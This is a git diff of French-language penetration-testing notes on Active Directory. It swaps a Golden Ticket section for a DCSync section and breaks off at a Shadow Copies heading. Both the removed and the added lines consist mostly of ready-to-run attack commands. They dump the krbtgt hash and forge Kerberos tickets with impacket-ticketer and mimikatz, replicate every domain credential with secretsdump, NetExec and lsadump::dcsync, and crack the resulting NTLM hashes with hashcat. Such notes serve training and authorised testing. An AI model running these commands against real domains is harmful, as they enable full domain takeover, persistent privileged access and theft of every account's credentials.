@@ -1,57 +1,40 @@
-# Golden Ticket
+# DCSync
 
-Forge un TGT entièrement offline en utilisant le hash NTLM du compte **krbtgt**. Permet de s'attribuer n'importe quels groupes/privilèges (Domain Admins, etc.) pour n'importe quel compte existant. Le DC accepte le ticket car il est chiffré avec la bonne clé.
+Imite un DC pour demander la réplication des credentials d'un utilisateur via l'API `IDL_DRSGetNCChanges` (protocole DRS). Le DC cible ne vérifie pas si la demande vient d'un vrai DC -  seulement que le SID a les droits requis.
 
-> Prérequis : avoir compromis le DC ou un compte DA pour extraire le hash krbtgt.
-> Durée par défaut : **10 ans** (contrairement aux TGT légitimes à 10h).
-> Utiliser le **hostname** et non l'IP pour forcer Kerberos -  avec l'IP, Windows bascule sur NTLM et l'accès est refusé.
+**Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.
 
-**Linux**
-
-1. Obtenir le hash krbtgt
-```bash
-# Depuis Kali via DCSync
-impacket-secretsdump -just-dc-user krbtgt corp.com/'DA_USER':'PASSWORD'@'IP_DC'
-# ou
-nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
-# → noter le hash NTLM de krbtgt
-```
-
-2. Forger et injecter le Golden Ticket
+**Depuis Kali (impacket-secretsdump)**
 
 ```bash
-# Obtenir le Domain SID ET le RID du compte cible en une seule commande
-impacket-lookupsid corp.com/'USER':'PASSWORD'@'IP_DC'
-# S-1-5-21-YYY-YYY-YYY-RID
-# Enlever le RID et on obtient le domain-sid
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@IP_DC
 
-# Forger le ticket (-user-id obligatoire sur Server 2022+)
-impacket-ticketer -nthash 'KRBTGT_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -user-id 'RID' 'USERNAME'
-# → génère <USERNAME>.ccache
-
-# Charger et utiliser
-export KRB5CCNAME=<USERNAME>.ccache
-impacket-psexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
-impacket-wmiexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
+# Dump tous les comptes
+impacket-secretsdump corp.com/jeffadmin:'PASSWORD'@IP_DC
 ```
 
-**Windows (Mimikatz)**
+**Depuis Kali (NetExec)**
 
-```
-# Purger les tickets existants
-kerberos::purge
-
-# Forger et injecter le Golden Ticket
-kerberos::golden /user:<USER> /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
-
-# Ouvrir un shell et utiliser (hostname obligatoire, pas IP)
-misc::cmd
+```bash
+nxc smb 'IP_DC' -u ''USER'' -p ''PASSWORD'' --ntds
 ```
 
-```cmd
-PsExec.exe \\DC1 cmd.exe
+**Depuis Windows (Mimikatz)**
+
+```
+lsadump::dcsync /user:corp\dave
+lsadump::dcsync /user:corp\Administrator
 ```
 
+**Cracker le hash NTLM obtenu (mode 1000)**
+
+```bash
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+> Les hashes NTLM obtenus par DCSync peuvent aussi être utilisés directement en **Pass-the-Hash** sans avoir à les craquer (voir Lateral Movement).
+
+---
 # Shadow Copies (NTDS.dit)
 
 Deux méthodes pour extraire tous les hashes du domaine :
